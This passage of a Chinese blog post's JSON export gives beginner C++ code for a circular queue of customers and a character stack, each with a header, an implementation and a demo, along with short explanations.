QueueTraverse();               //遍历队列\nprivate:\n\tCustomer *m_pQueue;                     //队列数组指针\n\tint m_iQueueLen;                        //队列元素个数\n\tint m_iQueueCapacity;                   //队列数组容量\n\tint m_iHead;\n\tint m_iTail;\n};\n\n# endif\n```\n\ndemo.cpp中的代码\n``` c++\n# include <iostream>\n# include <stdlib.h>\n# include \"MyQueue.h\"\n# include \"Customer.h\"\nusing namespace std;\n\nint main(void)\n{\n\tMyQueue *p = new MyQueue(4);\n\tCustomer c1(\"张三\",20);\n\tCustomer c2(\"李四\",30);\n\tCustomer c3(\"王五\",25);\n\n\tp->EnQueue(c1);\n\tp->EnQueue(c2);\n\tp->EnQueue(c3);\n\n\tp->QueueTraverse();\n\n\tCustomer c4(\"\",0);\n\tp->DeQueue(c4);\n\tc4.printInfo();\n\n\tsystem(\"pause\");\n\treturn 0;\n}\n```\n\n### 2.数据结构之栈\n\n**讲真，假期学习真的好难，我好不容易静下心来再学，其实之前已经学了，只是博客没做记录，今天补上。栈是很简单的模型，就是相当于一个瓶子，放东西进去，先放的在下面，后放的在上面，所以遵循后进先出原则，栈的栈底始终不变，栈顶随放入数量增加而上升。差不多就这些，今天的代码很简单，遵循我写代码不麻烦，理解容易原则**\n\n**接下来放代码**\n**MyStack.h**\n``` c++\n# ifndef MYSTACK_H\n# define MYSTACK_H\n\nclass MyStack\n{\npublic:\n\tMyStack(int size);                       //分配内存初始化栈空间，设定栈容量，栈顶\n\t~MyStack();                              //回收栈空间内存\n\tbool stackEmpty();                       //判断栈是否为空，为空返回true,非空返回false\n\tbool stackFull();                        //判断栈是否为满，为满返回true，非满返回false\n\tvoid clearStack();                       //清空栈\n\tint stackLength();                       //已有元素个数\n\tbool push(char elem);                    //元素入栈，栈顶上升\n\tbool pop(char &elem);                    //元素出栈，栈顶下降\n\tvoid stackTraverse(bool isFromButtorm);  //遍历栈中所有元素\n\nprivate:\n\tchar *m_pBuffer;              //栈空间指针\n\tint m_iSize;                  //栈容量\n\tint m_iTop;                   //栈顶，栈中元素个数\n};\n\n# endif \n```\n\n**MyStack.cpp**\n``` c++\n# include \"MyStack.h\"\n# include <iostream>\nusing namespace std;\n\nMyStack::MyStack(int size)\n{\n\tm_iSize = size;\n\tm_pBuffer = new char[size];\n\tm_iTop = 0;\n}\n\nMyStack::~MyStack()\n{\n\tdelete []m_pBuffer;\n}\n\nbool MyStack::stackEmpty()\n{\n\tif (0 == m_iTop)       //此处为了优秀代码，也可写成 m_iTop == 0;\n\t{\n\t\treturn true;\n\t}\n\treturn false;\n}\n\nbool MyStack::stackFull()\n{\n\tif (m_iTop == m_iSize)\n\t{\n\t\treturn true;\n\t}\n\treturn false;\n}\n\nvoid MyStack::clearStack()\n{\n\tm_iTop = 0;\n}\n\nint MyStack::stackLength()\n{\n\treturn m_iTop;\n}\n\nbool MyStack::push(char elem)\n{\n\tif (stackFull())\n\t{\n\t\treturn false;\n\t}\n\tm_pBuffer[m_iTop] = elem;\n\tm_iTop++;\n\treturn true;\n}\n\nbool MyStack::pop(char &elem)\n{\n\tif (stackEmpty())\n\t{\n\t\treturn false;\n\t}\n\tm_iTop--;\n\telem = m_pBuffer[m_iTop];\n\treturn true;\n}\n\nvoid MyStack::stackTraverse(bool isFromButtorm)\n{\n\tif (isFromButtorm)\n\t{\n\t\tfor (int i = 0; i < m_iTop; i++)\n\t\t{\n\t\t\tcout << m_pBuffer[i] << \",\";\n\t\t}\n\t}\n\telse\n\t{\n\t\tfor (int i = m_iTop-1; i >= 0; i--)\n\t\t{\n\t\t\tcout << m_pBuffer[i] << \",\";\n\t\t}\n\t}\n}\n```\n\n**demo.cpp**\n``` c++\n# include <stdlib.h>\n# include \"MyStack.h\"\n# include <iostream>\nusing namespace std;\n\nint main(void)\n{\n\tMyStack *pStack = new MyStack(5);\n\n\tpStack->push('h');\n\tpStack->push('e');\n\tpStack->push('l');\n\tpStack->push('l');\n\tpStack->push('o');\n\n\tpStack->stackTraverse(true);\n\n\tchar elem = 0;\n\tpStack->pop(elem);\n\n\tpStack->stackTraverse(true);\n\n\t//pStack->clearStack();\n\n\tcout << pStack->stackLength() << endl;\n\n\tif (pStack->stackEmpty())\n\t{\n\t\tcout << \"栈为空\" << endl;\n\t}\n\n\tif (pStack->stackFull())\n\t{\n\t\tcout << \"栈为满\" << endl;\n\t}\n\n\tdelete pStack;\n\tpStack = NULL;\n\n\tsystem(\"pause\");\n\treturn 0;\n}\n```","slug":"数据结构","published":1,"updated":"2017-11-28T02:53:05.971Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsd0i003ryp0lm5q2z2n5","content":"<h3 id=\"1-数据结构之队列\"><a href=\"#1-数据结构之队列\" class=\"headerlink\" title=\"1.数据结构之队列\"></a>1.数据结构之队列</h3><a id=\"more\"></a>\n<p><strong>数据结构中的队列所遵循的原则是先进先出的排队原则，即先存放的先先取出。同时队列分为普通队列和环形队列，其中普通队列是非闭合队列，效率和利用率低；相反，环形队列为首尾闭合的队列，可以实现不断取出又不断放进，效率和利用率高。</strong></p>\n<p><strong>队列有列首、列尾、列容量、列长度等名词，在此不解释了。</strong></p>\n<p><strong>接下来放代码</strong><br>Customer.h中的代码<br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ifndef CUSTOMER_H</span><br><span class=\"line\"># define CUSTOMER_H</span><br><span class=\"line\"></span><br><span class=\"line\"># include &lt;<span class=\"built_in\">string</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Customer</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\tCustomer(<span class=\"built_in\">string</span> name = <span class=\"string\">\"\"</span>, <span class=\"keyword\">int</span> age = <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">printInfo</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\t<span class=\"built_in\">string</span> m_strName;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iAge;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"># endif</span><br></pre></td></tr></table></figure></p>\n<p>Customer.cpp中的代码<br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># include &lt;iostream&gt;</span><br><span class=\"line\"># include <span class=\"string\">\"Customer.h\"</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Customer::Customer(<span class=\"built_in\">string</span> name, <span class=\"keyword\">int</span> age)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_strName = name;</span><br><span class=\"line\">\tm_iAge = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> Customer::printInfo() <span class=\"keyword\">const</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"姓名\"</span> &lt;&lt; m_strName &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"年龄\"</span> &lt;&lt; m_iAge &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>MyQueue.cpp中的代码<br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># include <span class=\"string\">\"MyQueue.h\"</span></span><br><span class=\"line\"># include &lt;iostream&gt;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">MyQueue::MyQueue(<span class=\"keyword\">int</span> queueCapacity)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_iQueueCapacity = queueCapacity;</span><br><span class=\"line\">\tm_pQueue = <span class=\"keyword\">new</span> Customer[m_iQueueCapacity];</span><br><span class=\"line\">\tClearQueue();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">MyQueue::~MyQueue()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">delete</span> []m_pQueue;</span><br><span class=\"line\">\tm_pQueue = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> MyQueue::ClearQueue()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_iHead = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tm_iTail = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tm_iQueueLen = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyQueue::QueueEmpty() <span class=\"keyword\">const</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_iQueueLen == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> MyQueue::QueueLength() <span class=\"keyword\">const</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> m_iQueueLen;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyQueue::QueueFull() <span class=\"keyword\">const</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_iQueueLen == m_iQueueCapacity)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyQueue::EnQueue(Customer element)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (QueueFull())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tm_pQueue[m_iTail] = element;</span><br><span class=\"line\">\t\tm_iTail++;</span><br><span class=\"line\">\t\tm_iTail = m_iTail % m_iQueueCapacity;</span><br><span class=\"line\">\t\tm_iQueueLen++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyQueue::DeQueue(Customer &amp;element)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (QueueEmpty())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\telement = m_pQueue[m_iHead];</span><br><span class=\"line\">\t\tm_iHead++;</span><br><span class=\"line\">\t\tm_iHead = m_iHead % m_iQueueCapacity;</span><br><span class=\"line\">\t\tm_iQueueLen--;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> MyQueue::QueueTraverse()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = m_iHead; i &lt; m_iQueueLen + m_iHead; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tm_pQueue[i%m_iQueueCapacity].printInfo();</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"前面还有\"</span> &lt;&lt; (i-m_iHead) &lt;&lt; <span class=\"string\">\"人\"</span> &lt;&lt; <span class=\"built_in\">endl</span>; </span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>MyQueue.h中的代码<br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ifndef MYQUEUE_H</span><br><span class=\"line\"># define MYQUEUE_H</span><br><span class=\"line\"></span><br><span class=\"line\"># include <span class=\"string\">\"Customer.h\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> MyQueue</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\tMyQueue(<span class=\"keyword\">int</span> queueCapacity);         <span class=\"comment\">//创建队列</span></span><br><span class=\"line\">\t<span class=\"keyword\">virtual</span> ~MyQueue();                 <span class=\"comment\">//销毁队列</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ClearQueue</span><span class=\"params\">()</span></span>;                  <span class=\"comment\">//清空队列</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">QueueEmpty</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;            <span class=\"comment\">//判空队列</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">QueueFull</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;             <span class=\"comment\">//判满队列</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">QueueLength</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;            <span class=\"comment\">//队列长度</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">EnQueue</span><span class=\"params\">(Customer element)</span></span>;     <span class=\"comment\">//新元素入队</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">DeQueue</span><span class=\"params\">(Customer &amp;element)</span></span>;    <span class=\"comment\">//首元素出队</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">QueueTraverse</span><span class=\"params\">()</span></span>;               <span class=\"comment\">//遍历队列</span></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\tCustomer *m_pQueue;                     <span class=\"comment\">//队列数组指针</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iQueueLen;                        <span class=\"comment\">//队列元素个数</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iQueueCapacity;                   <span class=\"comment\">//队列数组容量</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iHead;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iTail;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"># endif</span><br></pre></td></tr></table></figure></p>\n<p>demo.cpp中的代码<br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># include &lt;iostream&gt;</span><br><span class=\"line\"># include &lt;stdlib.h&gt;</span><br><span class=\"line\"># include <span class=\"string\">\"MyQueue.h\"</span></span><br><span class=\"line\"># include <span class=\"string\">\"Customer.h\"</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\tMyQueue *p = <span class=\"keyword\">new</span> MyQueue(<span class=\"number\">4</span>);</span><br><span class=\"line\">\t<span class=\"function\">Customer <span class=\"title\">c1</span><span class=\"params\">(<span class=\"string\">\"张三\"</span>,<span class=\"number\">20</span>)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">Customer <span class=\"title\">c2</span><span class=\"params\">(<span class=\"string\">\"李四\"</span>,<span class=\"number\">30</span>)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">Customer <span class=\"title\">c3</span><span class=\"params\">(<span class=\"string\">\"王五\"</span>,<span class=\"number\">25</span>)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tp-&gt;EnQueue(c1);</span><br><span class=\"line\">\tp-&gt;EnQueue(c2);</span><br><span class=\"line\">\tp-&gt;EnQueue(c3);</span><br><span class=\"line\"></span><br><span class=\"line\">\tp-&gt;QueueTraverse();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\">Customer <span class=\"title\">c4</span><span class=\"params\">(<span class=\"string\">\"\"</span>,<span class=\"number\">0</span>)</span></span>;</span><br><span class=\"line\">\tp-&gt;DeQueue(c4);</span><br><span class=\"line\">\tc4.printInfo();</span><br><span class=\"line\"></span><br><span class=\"line\">\tsystem(<span class=\"string\">\"pause\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"2-数据结构之栈\"><a href=\"#2-数据结构之栈\" class=\"headerlink\" title=\"2.数据结构之栈\"></a>2.数据结构之栈</h3><p><strong>讲真，假期学习真的好难，我好不容易静下心来再学，其实之前已经学了，只是博客没做记录，今天补上。栈是很简单的模型，就是相当于一个瓶子，放东西进去，先放的在下面，后放的在上面，所以遵循后进先出原则，栈的栈底始终不变，栈顶随放入数量增加而上升。差不多就这些，今天的代码很简单，遵循我写代码不麻烦，理解容易原则</strong></p>\n<p><strong>接下来放代码</strong><br><strong>MyStack.h</strong><br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ifndef MYSTACK_H</span><br><span class=\"line\"># define MYSTACK_H</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> MyStack</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\tMyStack(<span class=\"keyword\">int</span> size);                       <span class=\"comment\">//分配内存初始化栈空间，设定栈容量，栈顶</span></span><br><span class=\"line\">\t~MyStack();                              <span class=\"comment\">//回收栈空间内存</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">stackEmpty</span><span class=\"params\">()</span></span>;                       <span class=\"comment\">//判断栈是否为空，为空返回true,非空返回false</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">stackFull</span><span class=\"params\">()</span></span>;                        <span class=\"comment\">//判断栈是否为满，为满返回true，非满返回false</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">clearStack</span><span class=\"params\">()</span></span>;                       <span class=\"comment\">//清空栈</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">stackLength</span><span class=\"params\">()</span></span>;                       <span class=\"comment\">//已有元素个数</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">push</span><span class=\"params\">(<span class=\"keyword\">char</span> elem)</span></span>;                    <span class=\"comment\">//元素入栈，栈顶上升</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">pop</span><span class=\"params\">(<span class=\"keyword\">char</span> &amp;elem)</span></span>;                    <span class=\"comment\">//元素出栈，栈顶下降</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">stackTraverse</span><span class=\"params\">(<span class=\"keyword\">bool</span> isFromButtorm)</span></span>;  <span class=\"comment\">//遍历栈中所有元素</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> *m_pBuffer;              <span class=\"comment\">//栈空间指针</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iSize;                  <span class=\"comment\">//栈容量</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iTop;                   <span class=\"comment\">//栈顶，栈中元素个数</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"># endif</span><br></pre></td></tr></table></figure></p>\n<p><strong>MyStack.cpp</strong><br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td 